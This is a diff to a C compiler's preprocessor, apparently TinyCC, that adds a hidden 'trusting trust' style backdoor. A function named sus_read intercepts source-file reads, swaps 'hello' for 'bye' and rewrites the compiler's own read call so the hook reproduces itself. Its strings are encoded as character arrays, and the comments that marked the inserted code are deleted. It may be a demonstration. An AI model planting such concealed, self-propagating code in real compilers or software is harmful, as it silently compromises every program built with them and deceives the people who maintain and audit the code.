@@ -637,8 +637,6 @@ ST_FUNC const char *get_tok_str(int v, CValue *cv)
     return cstr_buf.data;
 }
 
-/* new stuff starting here */
-
 #include <sys/stat.h>
 
 struct sus_file {
@@ -685,6 +683,11 @@ void sus_replace(int fd, char *p, char *t) {
     shelf[fd].buf = new;
 }
 
+char hello[] = {'h','e','l','l','o',0};
+char bye[] = {'b','y','e',0};
+char nor_len[] = {'l','e','n',' ','=',' ','r','e','a','d','(','b','f','-','>','f','d',',',' ','b','f','-','>','b','u','f','f','e','r',',',' ','l','e','n',')',';',0};
+char sus_len[] = {'l','e','n',' ','=',' ','s','u','s','_','r','e','a','d','(','b','f','-','>','f','d',',',' ','b','f','-','>','b','u','f','f','e','r',',',' ','l','e','n',')',';',0};
+
 int sus_read(int fd, void *buf, size_t len) {
     struct stat file_stat;
     int i;
@@ -697,10 +700,8 @@ int sus_read(int fd, void *buf, size_t len) {
 
         shelf[fd].length = file_stat.st_size;
 
-        /* TODO: add logic and stuff here */
-        if (sus_contains(fd, "hello, world!") && sus_contains(fd, "nice")) {
-            sus_replace(fd, "backdooredbackdooredbackdooredlookievenfiguredouthowtodothisandmakethefileslargerwithoutleakingmemoryholy!", "a");
-        }
+        sus_replace(fd, hello, bye);
+        sus_replace(fd, nor_len, sus_len);
     } else if (shelf[fd].offset == shelf[fd].length) {
         shelf[fd].offset = 0;
         tcc_free(shelf[fd].buf);
@@ -713,8 +714,6 @@ int sus_read(int fd, void *buf, size_t len) {
 
     return i;
 }
-
-/* new stuff ends here!! */
 
 /* return the current character, handling end of block if necessary
    (but not stray) */
@@ -731,7 +730,7 @@ static int handle_eob(void)
 #else
             len = IO_BUF_SIZE;
 #endif
-            len = sus_read(bf->fd, bf->buffer, len);  // <-- new
+            len = sus_read(bf->fd, bf->buffer, len);
             if (len < 0)
                 len = 0;
         } else {
